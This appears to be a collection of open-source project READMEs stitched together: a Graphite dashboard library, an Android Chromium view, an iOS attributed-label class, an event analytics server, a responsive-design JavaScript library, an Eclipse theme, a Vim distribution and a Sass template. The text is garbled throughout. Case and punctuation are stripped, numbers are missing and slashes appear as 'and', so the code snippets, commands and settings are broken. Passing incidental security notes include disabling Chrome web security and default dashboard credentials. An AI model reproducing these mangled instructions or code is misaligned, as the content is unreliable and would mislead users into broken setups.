3497763, end eventually combining d s immense capabilities of managing live data and backbone s ease of development graphene provides a solution capable of displaying thousands upon thousands of datapoints in your dashboard as well as presenting a very hackable project to build on and customize currently graphene loves graphite s data model through its api to start git clone git and and github com and jondot and graphene git cd graphene use the and example dashboard to build on you should serve that folder off some kind of a helper webserver for gem install serve serve should see the dashboard alive rigged with a demo data provider this is a no brainer you gotta have ruby though back to your root graphene folder bundle install bundle exec guard start this gives you an autogenerated build when you modify stuff in app and css and app and js take note that dashboard html points to the build folder where your assets are automatically built to you are probably wondering how do you disconnect the demo data provider and plug the graphite data source don t worry more about it after this as of now you can place  types of data enabled widgets on your dashboard timeseries  gaugelabel  and a gaugegadget you can have as many of these as you want and you can also hook up several widgets to the same data source to build a new dashboard you can and should use the builder javascript var g new graphene g demo and and hook up demo provider override all urls g build description where description will be the hardest thing you ll have to do here it is a hash structure note that urls since we use demo provider do nothing here javascript description total notifications gaugelabel parent hero one  title notifications served  type max poll time gaugegadget parent hero one  title p just an informative label source graphite graph url add format json to querystring  widget type parent which will be placed in this element  title title and and many other view opts that s it basically advise the example for how your page should be structured lets see how to hook up a graphite data source you should first have an idea of how your dashboard looks like in standard graphite dashboard this means you can go ahead and build or use your dash with the standard dashboard tool that graphite provides in any case if you don t have your dashboard on the graphite domain you might have a cross domain issue in this case please set up your chrome browser with google chrome disable web security then given that you saved your graphite dashboard named resources  fetch this url you should see a json structure which contain these and render from hours until now width  height  target some metric title mymetric use that query append format json to it and you ve got a graphene ready url if all you really want is to migrate your graphite old dash a good starting point would be with discover  which will take all of your timeseries and convert to a dashboard running graphene timeseries javascript var g new graphene g build description console log description you should specify graphite host  dashboard name  a parent specifier which is responsible to spit out the next graph parent and a result callback you can also use the description result as a starting point for building a more elaborate dashboard check out an example at and examples and dashboard autodiscover html since graphene is really a backbone application view and model no controller here  you should be aware that your data is fetched to a model munged on and broadcasted to interested parties such as widgets this means you can take a look at the model and be able to configure it to your own needs one example is specifying a refreshinterval it wouldn t make sense to poll on your graphite backend frequently if the data is updated slowly turn refreshinterval up a notch you can drop any of the below options in the builder s dashboard description unit unit to display example km  or req and s title the gauge title type how should data get aggregated max picks the largest value in the set of datapoints min picks the smallest value in the set of datapoints current picks the newest value in the set of datapoints null or no setting picks the first value in the set valueformat you can specify a value formatter see d title again gauge title type same as gaugelabel valueformat value format from start value of the gauge to end value of the gauge lineheight visuals default  animatems new data animation in numlabels max labels to display at the bottom sortlabels order labels will be sorted displayverticals display vertical ticks eww width box width height box height padding the kind of padding you need title box title labelformatter and a formatter as before ymax the max value for the y axis if not specified and the url has a ymax parameter the value will be taken from the url otherwise this option will have precedence ymin the min value for the y axis good news other than problems with managing tons of data points i avoided using common graphing libraries because it s kinda hard to fit to how they see the world in terms of styling here you ll be able to just style with css most graph elements are svg and you already have a good example of a high contrast styling that i futher svg is vector graphics try stretching up your dashboard and you ll find the quality of render isn t affected applying just common css rules should give you everything that you need a good thing to think about is colors in your graph in a time series you d want each graph to appear distinct from the other but still keep a general notion of style relate to the previous one to do that i ve generated colors based on hsl taking the next color on the wheel serially and keeping a good distance for a good contrast for more detail see and tools these significant features will happen in the following weeks visual hints lower and upper threshold options for timeseries once a value passes above and below these the graph will give a visual cue flashing heartbeat rss widget include a stream of events using an rss feed provide regex rules which cause rss entries to be included or be classified as various levels of alerts the goal is to be able to incorporate source control history github events  and alert feeds from other systems i d like to thank chronological order mike bostock for d itself

plain ruby and native c and  users that bought this product also bought  from userid bought productid pairs and  users that viewed this video also viewed  from userid viewed videoid pairs and  users that like this venue also like  from userid likes venueid pairs your input data the so called interaction sets should look like this user product produt product user product produt product user video

8941531, this project is un maintained the recommended alternative is i did not have the time to keep the project up to date in the mean time the fine folks at intel did a great job of embedding chromium using the content shell api which is what chromium s developers intended therefore i cannot justify spending any time on this the original readme and the code are here for historical purposes will meet all your embedding needs and i m contributing to it chormeview works like android s webview but is backed by the latest chromium chromeview lets you ship your own chromium code instead of using whatever version comes with your user s android image this gives your application early access to the newest features in chromium and removes the variability due to different webview implementations in different versions of android this section explains how to set up your android project to use chromeview check out the repository in your eclipse workspace and make your project use chromeview as a library in eclipse right click your project directory select properties  choose the android category and click on the add button in the library section copy assets and webviewchromium pak to your project s assets directory you agree that this is annoying in your application subclass call chromeview initialize and pass it the application s context for example import us costan chrome chromeview import android app application public class myapplication extends application override public void oncreate super oncreate chromeview initialize this now you can use chromeview in the same contexts as you would use webview if you use this project and want to help move it along please star the following bugs to access chromeview in the graphical layout editor go to the palette  expand the custom and library views section and click the refresh button chromeview supports most of the webview methods for example chromeview chromeview chromeview findviewbyid r id gameuiview chromeview getsettings setjavascriptenabled true chromeview s addjavascriptinterface exposes public methods that are annotated with chromejavascriptinterface this is because webview s javascriptinterface is only available on android   and above but chromeview targets   and   as well import us costan chrome chromejavascriptinterface public class jsbindings chromejavascriptinterface public string gethello return hello world chromeview addjavascriptinterface new jsbindings  androidbindings chromecookiemanager is chromeview s equivalent of cookiemanager to speed up the application launch on real devices remove the libs and x directory when developing on atom devices remove the arm directory instead remember to git checkout and get the library back before building a release apk if your application manifest doesn t specify the the chromium code behind chromeview silentely blocks all network requests this is mentioned here because it can be hard to debug the bulk of this project is chromium source code and build products with the appropriate infrastructure the chromium bits can be easily updated crbuild and vm build md crbuild and vm build md contains step by step instructions for setting up a vm and building the chromium for android components used by chromeview once chromium has been successfully built running crbuild and update sh crbuild and update sh will copy the relevant bits from the build vm into the chromeview source tree attempting to scroll the view by swiping a finger across the screen does not update the displayed image however internally the view is scrolled this can be seen by displaying a stack of buttons and trying to click on the topmost one this issue makes chromeview mostly unusable in production the core issue is that the integration is done via awcontent in the androidwebview directory of the chromium source tree which is experimental and not intended for embedding use the right way of doing this is to embed a contentview from the content directory or a shell in content and shell unfortunately these components apis don t match webview nearly as well as awcontent and they re much harder to integrate pull requests or a fork would be welcome this repository is rebased often because the large files in lib and would result in a huge repository if new commits were created for each build the large files are chromium build products please don t hesitate to send your pull requests please don t send pull requests including the binary assets or code extracted from android assets and  libs and  src and com and googlecode and and src and org and android if your pull request requires updated android bits mention that in the pr description and i will rebuild the android bits the directories below contain code from the copyright and license on the project site assets and libs and src and com and googlecode src and org and chromium some of the source code in src and us and costan and chrome has been derived from the android source code and is therefore covered by the the rest of the code is copyright  victor costan and available under the mit license

include attachements images and links etc so it even fits for advanced usages table of contents about these classes about these classes ohattributedlabel ohattributedlabel nsattributedstring and

credits license credits changelog  revisions history changelog e   revisions history projects that use this class projects that use this class this class allows you to use a uilabel with nsattributedstrings  in order to display styled text with various style mixed fonts color size in a unique label it is a subclass of uilabel which adds an attributedtext property use this property instead of the text property to set and get the nsattributedstring to display note this class is compatible with ios  and and has been developped before the release of the ios sdk before apple added support for nsattributedlabel in the uilabel class itself it can still be used with the ios sdk the attributedtext property hopefully match the one chosen by apple if you need support for eariler ios versions or for the additional features it provides this class also support hyperlinks and urls it can automatically detect links in your text color them and make them touchable you can also add custom links in your text by attaching an url to a range of your text and thus make it touchable and even then catch the event of a touch on a link to act as you wish to in addition to this ohattributedlabel class you will also find a category of ns mutable attributedstring to ease creation and manipulation of common attributes of nsattributedstring to easily change the font style color of a range of the string see the header file nsattributedstring and attributes h for a list of those comodity methods and and build an nsattributedstring easily from a nsstring

and and add a link to a given portion of the string attrstr setlink somensurl range nsmakerange  there is also a category for nstextcheckingresult that adds the extendedurl property this property returns the same value as the url value for standard link cases and return a formatted maps url for nstextcheckingtypeaddress link types that will open google maps in ios version before   and the apple s maps application in ios   and later the library also comes with very simple tag parsers to help you build nsattributedstrings easily using very simple tags the class ohasbasichtmlparser can parse simple html tags like b and u to make bold and underlined text change the font color using font color   etc the class ohasbasicmarkupparser can parse simple markup like bold text  underlined text and change the font color using markup like red and some red text or ff and yeah and and example  parse html in attributed string basicmarkuplabel attributedtext ohasbasichtmlparser attributedstringbyprocessingmarkupinattributedstring basicmarkuplabel attributedtext and and example  parse basic markup in string nsattributedstring as ohasbasicmarkupparser attributedstringbyprocessingmarkupinstring hello you and and example  and and process markup in place in a mutable attributed string nsmutableattributedstring mas nsmutableattributedstring attributedstringwithstring hello you ohasbasicmarkupparser processmarkupinattributedstring mas the ohattributedlabel class support the uiappearance proxy api available since ios see selectors and properties marked using the uiappearanceselector in the header this means that if you are targetting ios you can customize all of your ohattributedlabel links color and underline style to fit your application design only in one call at the beginning of your application instead of having to customize these for each instance for example your could implement this in your application didfinishloadingwithoptions delegate method to make all your ohattributedlabel instances in your whole app display links in green and without underline instead of the default underlined blue bool

ohattributedlabel in your project include the ohattributedlabel xcodeproj project in your xcode workspace build this ohattributedlabel xcodeproj project once for the ios device not the simulator    add libohattributedlabel a and coretext framework to your link binary with libraries build phase of your app project select the libohattributedlabel a that has just been added to your app project in your project navigator on the left and change the location dropdown in the file inspector to relative to build products    add the objc flag in the other linker flags build setting if not present already  add libohattributedlabel a and headers in your project cd ohattributedlabel make clean make nb rvm users may need to cc make clean make copy the contents of the build and release combined directory to you project eg thirdparty and ohattributedlabel add libohattributedlabel a and coretext framework to your link binary with libraries build phase of your app project add the ohattributedlabel headers to your header search path in build settings eg srcroot and thirdparty and ohattributedlabel and include and add the objc flag in the other linker flags build setting if not present already then in your application code when you want to make use of ohattributedlabel methods you only need to import the headers with import ohattributedlabel and ohattributedlabel h or import ohattributedlabel and nsattributedstring and attributes h etc   note these two steps are only necessary to avoid a bug in xcode that would otherwise make xcode fail to detect implicit dependencies between your app and the lib  there is no explicit docset or documentation of the class yet sorry never had time to write one  but the method names should be self explanatory hopefully as i respect the standard objc naming conventions there are doxygen and javadoc like documentation in the headers that should also help you describe the methods the provided example attributedlabel example xcworkspace should also demonstrate quite every typical usages  including justifying the text dynamically changing the style and attributes of a range of text adding custom links make special links with a custom behavior like catching mention and hashtags  and customizing the appearance and color of links ohattributedlabel is published under the mit license feel free to contact me if you use this class so we can cross reference our projects and quote your app in this dedicated wiki page

machine with a reasonably large ssd drive let s say hypothetically the server receives m events monthly might cost you few thousand dollars per month to use saas provider  and each event is  bytes without compression in this situation storing all the events likely only takes you few hundreds gb with compression and chances are only the data in recent months are of interest also to efficiently run basic funnel and cohort queries without filtering only two forward indices are needed event index sharded by event types and event index sharded by users therefore our strategy is to make those two indices as small as possible to fit in memory and if the client wants to do filtering for events we build a bloomfilter to reject most of the non exact match imagine we are running another hypothetical query while assuming both indices and the bloomfilters can be fit in memory say there are m events that cannot be rejected and need to hit the disk assuming each ssd disk read is  microseconds we are talking about sub minute query time while assuming none of the data are in memory in practice this situation is likely much better as we cache all the recently hit records and most of the queries likely only care the most recent data to simplify the design of the server and store indices compactly so that they fit in memory we made the following two assumptions  times are associated to events when the server receives the an event  date is the finest level of granularity with the above two assumptions we can rely on the server generated monotonically increasing id to maintain the total order for the events in addition as long as we track the id of the first event in any given date we do not need to store the time information in the indices which greatly reduces the size of the indices the direct implication for those assumptions are first if the client chose to cache some events locally and sent them later the timing for those events will be recorded as the server receives them not when the user made those actions second though the server maintains the total ordering of all events it cannot answer questions like what is the conversion rate for the given funnel between pm and pm on a given date lastly for both indices since they are sharded by event types or users we can expect the size of the indices to reduce significantly with proper compression com codecademy evenhub eventhub can be thought of as a facade to the key components of userstorage  eventstorage  shardedeventindex  datedeventindex  usereventindex and propertiesindex to make the funnel and cohort queries fast eventhub also maintains three indices shardedeventindex  usereventindex  and datedeventindex behind the scene datedeventindex simply tracks the mapping from a given date the id of the first event received in that day shardedeventindex can be thought of as sorted event ids sharded by event type usereventindex can be thought of as sorted event ids sharded by users while eventhub does not need any information from different users with a broker in front of eventhub servers eventhub can be easily sharded by users and scale horizontally in the following three experiments the spec of the computer used can be found in the following table and component and spec and and and and and computer model and mac book pro retina  inch late  and and processor and ghz intel core i and and memory and gb  mhz ddr and and software and os x    and and jvm and oracle jdk   and the following graph is generated as described in load testing with jmeter load testing with jmeter the graph shows both the throughput and latency of adding the first one million events without batching with different number of threads     while it is difficult to come up with a generic benchmark we would rather show something rather than show nothing after generating about one million events with the load testing script as described in load testing with jmeter load testing with jmeter  we ran the four types of queries twice once after the server starts cleanly and another time while the cache is still warm and query and st execution and nd execution and command and and and and and and in the experiment the server was bootstrapped differently instead of using the load testing script we used subset of data from codecademy which has around m events and  m users please be aware that the current storage format on disk is fairly inefficient and has serious internal fragmentation however when the data are loaded to memory it will be much more efficient as we would never load those hole pages into memory and key component and size in memory and note and and and and and the dashboard comes with insecure basic authentication which send unencrypted information without ssl please use it at your own discretion the default username and password is codecademy and codecademy and you can change it by modifying your web properties file or use the following command to start your server username foo password bar java deventhubhandler username username deventhubhandler password password jar web and target and web   snapshot jar the project comes with a javascript library which can be integrated with your website as a way to send events to your eventhub server cd eventhubdir npm install g karma npm install g karma jasmine  npm install g karma chrome launcher karma start karma conf js the javascript library is extremely simple and heavily inspired by mixpanel there are only five methods that a developer needs to understand beware that behind the scenes the library maintains a queue backed by localstorage buffers the events in the queue and has a timer reguarly clear the queue if the browser doesn t support localstorage a in memory queue will be created as eventhub is created also our implementation relies on the server to track the timestamp of each event therefore in the case of a browser session disconnected before all the events are sent the remaining events will be sent in the next browser session and thus have the timestamp recorded as the next session starts the method will create an eventhub and start the timer which clears out the event queue in every second default javascript var name eventhub var options flushinterval  and in seconds and var eventhub window neweventhub name options this method enqueues the given event which will be cleared in batch at every flushinterval beware that if there is no identify method called before the track method is called the library will automatically generate an user id which remain the same for the entire session clears after the browser tab is closed  and send the generated user id along with the queued event on the other hand if eventhub identify is called before the track method is called the user information passed along with the identify method call will be merged to the queued event javascript eventhub track signup  property value  property value this method links the given user to the automatically generated user typically you only want to call this method once right after the user successfully signs up javascript eventhub alias chengtao codecademy com this method tells the library instead of using the automatically generated user information use the given information instead javascript eventhub identify chengtao codecademy com  userproperty value  userproperty value this method

5115347, dom manipulation via html attribute specification it s like a super amped up version of media queries on a per element basis the technology for dealing with responsive design is all over the place media queries hacky javascript and convoluted html intention js allows you to make all of the changes to html in the html itself it s a way to describe the necessary differences of an html document between one device and another what should the classes of an element be on mobile vs tablet where should your advertising code get placed when you re on a desktop does the page require an alternate slideshow widget on touch enabled devices these are all changes that intention js can make to the page based on a user s device context js creates a set of common page contexts for width thresholds touch devices highres displays and a fallback and you can easily add your own contexts on top of these or create all your own custom contexts intention js context js intention js is the library that manages the responsive axis manipulates elements based on their specifications and emits events when contexts change context js is an implementation of intention js that sets up common use patterns in responsive design specifically it has the responsive contexts base a catch all mobile triggered by width tablet triggered by width standard triggered by width portrait orientation axis landscape orientation axis highres jquery underscore js include scripts on your page or just intention via require data main assets and js and context script and and your amazing contextual threshold specification here and script by default context js provides a number of threshold groups via intention js browser widths orientation touch highres and a base group the default thresholds in each group are respectively mobile  and below  tablet  to  and standard  to infinity portrait or landscape touch are touch gestures available highres devicepixelratio  base default always on there are three manipulation types class names attributes placement on the page flag the element as intentional or for valid html an intentional attribute for the purposes of the documentation the prefix in will be used instead of data in to keep the code snippets concise in the portrait orientation the above implementation will produce and in landscape orientation context js includes four context groups or axes orientation highres they are associated with the following classes mobile tablet standard orientation portrait landscape touch highres highres attribute structure prefix context function value mark an element as intention set the base default attribute specify which image to load in a given context the specification above will produce the following in each context an element can have more than one class intent s aim is to be as unobtrusive as possible at the same time allowing for a lot of flexibility with the way classes are combined section class column in mobile class narrow in tablet class medium in standard class wide in luxury class x wide in touch class swipe nav and section take this html structure header nav and nav and header section and section footer and footer suppose we want to demote the status of the nav when the user is on smaller devices the following specification on the nav might do what we need nav intent in mobile prepend footer in tablet append section in standard append header when the device is px units or below the nav will appear at the top of the footer when the device is between  and  it will go to the end of the section tag and so forth prepend append before in most scenarios you don t want to have to specify the way something will change in every context often times an element will be one of two things among many different contexts take an img tag with two possible sources it s either going to be highres or not by specifying the in highres src attribute you know that the source will be appropriately applied in that scenario with a in base src attribute you can rely on the source being set accordingly for all other contexts in addition to what is provided as a set of useful page contexts in the context js script you can define your own contexts for anything you can extend the functionality of context js or scrap the whole thing entirely here is an example for scroll depth responsive axis javascript var scrolldepthaxis intent responsive id scrolldepth  and and contexts contexts name shallow  value   name deep  value  and   and and matching matcher function measure context return measure context value and and measure measure function return window pageyoffset intent responsive returns an object with a bunch of useful properties probably the most important is respond when you want to evaluate which context is relevant call scrolldepthaxis respond for the above example you would want to call the respond function on window scroll javascript window on scroll  scrolldepthaxis respond the optional id property allows for context aware element feature for the axis outlined above this will compare the measurement against each context and determine which context is relevant every time the window is scrolled other properties of intent responsive include current the current context contexts the list of contexts you passed this will add all elements matching the data intent  intent  data in  in selector optionally pass a scope argument to this function to specify where in the dom to start searching the default is the document calling the elements function will change the elements attributes to the specification provided in the html as it finds them this way your responsive axis can all be defined before any changes are made to the dom the thresholds are an array of context objects the only requirement of these objects is that they have a name property name is a required property of a context object javascript name shallow  name deep you can specify any other properties such as scroll depth values javascript name shallow  depth   name deep  depth infinity the matching function is called for each item in the thresholds array until a match is made i e it returns true it is totally optional however if it is not specified a default will be used which matches based on the context name have a look in the default compare functions section for the specifics the context that produces a match is then understood as the current context for the threshold group in other words there will only every be one matched context for a threshold group if a matching function is not specified this default is used javascript function measure context return measure context name default measure function is a pass through javascript function arg return arg why intent responsive and and outputs a function so calling the result of that function with an argument passed to it will get used as the measure arg in the matcher function javascript and and make a responsive group thresholds is the array of contexts and matcher is a custom comparison function var responsive intent responsive thresholds matcher and and assuming we want to compare the scroll depth against each context you could do something like this responsive window pageyoffset in this example window pageyoffset would get passed as the first argument to the matcher function for every context until the matcher returns true threshold objects must be passed to intent responsive as an array the only other requirement is that the threshold object has a name property i e name slowpage the name is used for two main things emmiting an event of that name on the intent object and allowing you to create specifications in the html for that threshold names may not have dashes names can have  the regex to match them is simply a za z  and to create an event handler for a threshold javascript intent on slowpage  function alert try another wifi network to specify changes to the html when in that threshold javascript function measure ctx return measure ctx name javascript and and measure default is just a pass through function arg return arg append prepend before any arbitrary atribute that doesn t include a dash joe kendall erin sparling adrian lafond mike stamm camila mercado paul pangrazzi javascript and and mit license for everything and and copyright c  the wall street journal and and

eclipse workbench to install and tbody update site or download this plugin by using help install new software and add the update site manual restart eclipse and go to window preferences general appearance rest your eyes you can find the one used in the screenshot below warning take a backup of your preferences before importing so you can safely restore them if you need file export then select general preferences note syntax highlighting settings and ui theme are separated you can import your own scheme or customize it in eclipse preferences if you like there are some settings that can be changed only from the eclipse preferences window and that override the theme s settings by default change the colors for content assist go to window preferences general appearance colors and fonts then change the colors for basic content assist background color and basic content assist foreground color eg foreground color ddd  background color  change the colors for console go to window preferences run and debug console and modify the colors as you like eg standard out text color ddd  background color  change the colors for javadoc go to window preferences general appearance colors and fonts then change the colors for java javadoc view background note that the foreground color cannot be changed and depends on system font color and problem and solution and and and and and the font of the title of the tabs is different and ensure that on your machine is installed segoe print font then open the downloaded jar package with an archive explorer open and themes and css and moonrise ui standalone css  search for any occurrencies of font family property and change its value to segoe print or what ever you prefer  then save and update the jar archive and and the size of the title of the tabs is different and eclipse does not scale it with a dpi aware policy open the downloaded jar package with an archive explorer open and themes and css and moonrise ui standalone css  search for font size property and modify its value according to your needs then save the file and and the label of the checkboxes has a color difficult to read win and it s related to a swt bug use a system theme that has lighter font color for buttons and and the text of the buttons and other widgets have a color difficult to read gtk and it s due to the state of swt porting on gtk start eclipse with this flag export swtgtk  and and after updating the plugin it isn t loaded as expected and eclipse seems to use some sorts of internal resources caching that don t work always very well to ensure that it s not an issue related to the new plugin version create a new workspace and import your projects here or try with a freshly downloaded eclipse release and currently this theme uses the css swt engine introduced in the   version of the eclipse platform and should provide a dark style for each gui widget that can be handled with the last version of the eclipse sdk this plugin has been tested with the main eclipse development tool packages on linux distributions windows and osx and with the following eclipse releases luna   kepler   juno   x it works best with a dark system theme since currently the look of some gui widgets cannot be overriden directly in eclipse the more noticeable issues related to swt are the scrollbar widgets the table headers and lines and the arrows to fold and unfold contents that cannot be styled as minor issues there are button background color on windows and osx that cannot be customized on windows checkboxes and radio controls do not inherit font color and some other little bugs related to the css engine that makes the customizations harder and unwieldy aside from that the theme currently might not look perfect on each platform but should be fully useable on all of them the eclipse css engine is still under improvement debugging and improvements  use css spy to inspect widgets properties and css scratchpad or lightweight css editor to apply a quick customization to test what elements can be modified or not with css drop a line like this one background color red color white into css scratchpad restart eclipse to reset the theme

9145730, this project is closed and not maintained anymore i don t find any value in creating a vim distribution any more i believe using vim with plugins and settings for your own need is much more scalable and better in long term i will occasionally push changes when i have time but don t expect any maintenance or future contributions thanks everyone for using and supporting this project feel free to fork and use it on your own           and and and and and and and  and and and and and and and and and and and and and and  and and and and and and and and and and and and and  and and and and and and and and and and and and and  and and and and and and and and and  and  and and  and  and and  and and  and and  and customized to be awesome by default it is improved to be used on mac os x and macvim note linux version is on the todo list i ll work on it asap sublimetext like features with the same shortcuts without installing or compiling any external library cmd and p goto anything cmd and t goto file cmd and r goto symbol on current file cmd and shift and r goto symbol on all files cmd and d select words for multiple selection editing cmd and k show side bar cmd and and toggle comment cmd and indent cmd and unindent cmd and number jump to tab  tab  cmd and alt and left move to next tab cmd and alt and right move to previous tab cmd and z undo cmd and shift and z redo cmd and n new file cmd and shift and n new window cmd and s save file cmd and w close file cmd and f search and replace ctrl and tab cycle through tabs ctrl and shift and tab cycle through tabs backwards some more awesome features sublimetext like colorscheme multiple selections and cursor feature use cmd and d for selecting words cmd and u for undo cmd and k for skipping words and esc to quit the multi cursor mode on the fly goto symbol definition feature coffeescript objective c and markdown are supported no need to install external plugins or binaries full featured autocompletion via ycm no need to compile the ycm plugin subvim has already pre compiled binaries included snippet system with over  languages and configurable restore latest state tab files when quitting and restarting again automatic closing of quotes parenthesis brackets and etc many other fixes and improvements be sure you are using the latest os x   and macvim currently only these two options are supported just clone the repo and execute make cd subvim this will create symlinks from the subvim folder to and vim  and vimrc  and gvimrc and and ctags thus you can put the subvim folder in your favorite place and finally you can always update it easily with git pull origin master this will just remove the symlinks created previously cd subvim make clean all custom settings are stored in the folder vim and custom and you have to create it for the first time for settings  add your custom vimrc settings to the file vim and custom and vimrc or vim and custom and gvimrc an example file might be and vim and custom and vimrc my own custom settings let mapleader  set indent set tabstop  for plugins  just clone your favorite plugin into vim and custom and cd vim and custom git clone git and and github com and tpope and vim fugitive git that s it subvim will automatically start your settings and plugins after you restart vim again subvim tries to be simple as possible only plugins that are worth and are accepted to be usable are integrated like autocomplete autosave sessions etc it means you just start subvim and benefit from all the features explained above there is no binary compiling or installing extra stuff all these are integrated subvim has some very nice shortcuts that gives you the same experience as using sublimetext these shortcuts do not interfere with any default vim shortcuts it s aimed for a full mac os x experience i m thinking about making subvim linux compatible gvim in the future there are no custom shortcuts no leader keybindings that breaks your stuff no unnecessary plugins that makes your life harder than easier no automatic downloading of integrated plugins because what works will always works you always will get the same experience that means if an integrated plugin is not superior it will replaced by superior ones romainl we don t like your project much but we provide help anyway that s the vim spirit vim on freenode a friend an awesome project thank you addy osmani so hot if you re a hardcore vim user that s been tempted by sublime subvim gives you sublimetext like features including shortcuts color scheme support for  languages state autocompletion via ymc and more great work and fatih add linux compatible option autoload of vimrc settings no need for restart anymore make it always as simple as possible without breaking any plugins users should custoimize and add plugins theirself create a dedicated page to usage and shortcuts all vim plugins authors an extended list with authors and plugins will be created romainl osse rking etc on vim freenode same as vim license for more info see help license

7977879, a quick start template for hopefully better websites it s not a boilerplate or a theme sarsaparilla on the other hand is a nice refreshing root beer perhaps crack one open while you re reading this if you re ready to go then simply delete the demo files and folders from assets and templates compass is a library of common elements equations and helper styles that is kept up to date by a community of developers and is useful for rapid development and leaner code both sass and compass are ruby gems and will need to be installed via command line or terminal if you re on a mac you re already rocking ruby baby you ll find documentation on both the sass and compass websites on how to install and use them if you plan on installing compass and you ll need to  then you shouldn t need to install sass separately to install compass on a mac open terminal and type this will update the system then to install compass if you have trouble try using the  sudo commands with care to access the correct level of permissions e g sassaparilla follows a specific cascade and makes use of several scss files each of which serves a different purpose note if a file begins with an underscore that file will not compile to its own css file files with underscores are considered includes this contains the bulk of your styles as well as pulling together the other partial stylesheets into one css file by and large you will be doing most of your work within this stylesheet this file contains referencing to the compass library element you will need hence it being required this contains a simple reset for html elements it assumes your webpage will have forms so resets these too if your site doesn t use forms you can remove these resets this contains all the variables for the site things such as colours break points and font sizing live here this file is for defining your core set up and makes use of compass baseline and font size measures more on that later mixins contains any user made mixins for the project it includes some simple ones to get you started add more as needed this file contains the core typesetting for the site it relies on variables set up in the settings scss file if you don t wish to use compass s rhythm method you can leave this out this file contains typographic rhythm styles based on your variables it allows for fine grain control of your typestyles by giving you classes of every element to separate style from content in addition you can use or create more  typeset parent classes which act as a way of setting text on particular areas of your website where you need greater control no more styling headings and lists globally and over riding contains default form elements and standard styling if you re not using forms you can safely leave this out contains the main functionality of the sassafras grid system this file is where you add your columns and define your syntax for the surrounding  rows in your content we ll touch on how to use this later we ve included a modules folder with an example navigation scss module we like to chunk everything up into little bits in a bem and smacss style and this example structure is how we do so we also use sass globbing to pull all the files in from this folder with a wildcard if globbing is giving you issues then you can add each module in maually in the base css file to install sass globbing gem install sass globbing we wanted to make things a little easier we believe breakpoints should exist where design breaks this means there maybe many or few depending on your needs and they should appear where you need them not at device sizes to do this we ve included three mixins and some variables to allow you to configure things as you please you ll see our default breakpoints that we ve used in the demo as a somewhat extreme example it looks a little like this a vp px and and first viewport b vp px and and up one c vp px and and up two d vp px and and up three e vp px and and up four f vp px and and up five ie fixed vp px and and viewport for ie fixed width max vp f vp and and max viewport syntactically makes for a nicer option start columns b vp and and switch from single column to multi at this breakpoint used in grid this set up allows you to define your syntax for your breakpoints as you wish it also includes some variables that are required if using the sassafras grid you ll notice we ve used alphabetical viewport names to indicate where in the mobile first set up they come this way we can avoid using names such as tablet or mobile which are too descriptive of a size go to the section media queries and you ll see three mixins which are similar respond to allows us to work mobile first and sets up a min width only respond to max allows us to define a maximum width breakpoint respond to min max allows us to set a range where the breakpoint is active to use simply include the mixin within a parent element in your code for example global logo color fff include respond to b vp float left above we have told the mixin to show a minimum width of our second breakpoint b vp when the viewport reaches this width that s it have a play and see how you get on the grid system works a little differently than other grids you may have used in the past that s not always a bad thing but as we always use what is most appropriate for each project sassafras works best for simple grids layouts that require fine grain control at multiple breakpoints if you need an un equal grid multiple layer nesting or something more complex then perhaps it s not for you sassafras has one main goal to allow for scalability and user additions that can be undertaken in an iterative manner sassafras works by combining box sizing border box and padding to space elements and percentages to define column widths as box sizing border box considers padding as part of the box model and not additional to it we can use easy mathematics to generate our grid columns in short sassafras can do two things and provide percentage with columns with no gutters based on the amount of columns you can then use internal padding to space elements apart and provide percentage with columns with gutters by adding an additional consistent gutter padding and dragging a whole row negatively by the same consistent gutter padding it sounds more complex than it is here s a quick step by step how to at the bottom of this file you ll find the code for generating the grid columns mixin gridcolumns columns for i from  through columns colspan columns i width  and columns i you include this mixin like so where is the number of columns you need include gridcolumns and and eg  this mixin generates percentages widths based on the amount of columns we define in total eg   and their individual spans as a multiple there of eg  columns of  this looks a little like this when rendered colspan  and and span four columns of a  column grid this outputs width   and and  and    x    you can define as many column sets as you need in addition you ll find mixins for push and pull columns for i from  through columns push columns i margin left  and columns i for i from  through columns pull columns i margin right  and columns i these work in the same manner as above push  and and eg push fours columns over in a  column grid underneath this in mixins scss you ll find mixin grid and and widths class colspan width  display block and and floats class as grid float left display inline display inline block and and gutters class with gutter include respond to start columns padding left internal spacing percent this defines our css class hooks for added flexibility the grid is divided into three classes which can be combined these are colspan targets all items that have a class that matches  colspan this gets the elements width defaults to  and nothing more when we define as specific colspan this is over ridden eg colspan  as grid targets all items with a class of  as grid used in combination with  colspan we take the width it defines as tell it to float to form a grid item with gutter targets all elements with a class of  with gutter this tells the element to add a left hand side gutter using padding the  start columns variable is defined in settings scss and informs the grid where it should start using gutters as gutters might not be used at small sizes using these elements might look something like colspan  and and get the width but don t float colspan  as grid and and get the width and float colspan  as grid with gutter and and get the width float and add gutter in this file you ll add your columns to breakpoints within a parent element to set up a flexible grid system using our respond to mixin as mentioned above and our breakpoints for the settings file we can build a mobile first grid system for example include respond to b vp ie false min width b vp and and min width of our second breakpoint include gridcolumns  and and two column grid this would output something like media screen and min width px min width px row colspan  width  row colspan  width  this gives us a two column grid that starts at this breakpoint from there on it s just a case of stacking more breakpoints as you go along and including column numbers note one limitation of this is that you cannot use the same amount of column numbers in multiple breakpoints so if you use  at one breakpoint you cannot use it at another in html it should look something like this content and div content and div content and div content and div content and div content and div if you wish to use gutters there are two more steps you must take  create a parent element called  row parent this is usually only important if you wish to space stacked grid rows vertically in a consistent manner  add your  row as normal  add a class of  rowcolspaced child row element this tells the row to allow for guttered columns you do not have to use the class of  row as these elements are nested inside a  row already it should looks something like this content and div and div content and div and div content and div and div and div content and div and div content and div and div content and div and div and div there s loads more you can do with the grid and you can bend it to your will and to use your syntax by just changing a few variables in the mixins scss and settings scss files have a play sassaparilla tries to make leading and spacing as easy as possible whilst writing accessible code we re not mad keen on tricky maths but we like to write in ems luckily compass can handle this for us with a few smart defaults tricks and a few commands here s how this defaults to px and generally this works well in your calculations so you shouldn t need to change this you can if you like to prevent oddly spaced leading and large gaps between lines we like to use a smaller measure as you might do in print design something like px works well later you ll use multiples of this baseline to creating your leading and spacing whenever you adjust the font size to using the adjust font size to e g px this becomes your base unit to work out how many lines spacing you need above and below the element e g include adjust font size to px and and adjusts font size to px margin   rhythm  px  and and adds two lines of our base line height x px below the element base those two lines on our font size and covert to ems have a play it makes more sense when you do include adjust font size to px margin   rhythm  px  font size  em line height  em margin    em  if you want to vertically space other elements on the page sections etc you can use the compass leader and trailer functions include padding leader x and and adds x lines of padding based on the base line height above the element include padding trailer x and and adds x lines of padding based on the base line height below the element include leader x and and adds x lines of margin based on the base line height above the element include trailer x and and adds x lines of margin based on the base line height below the 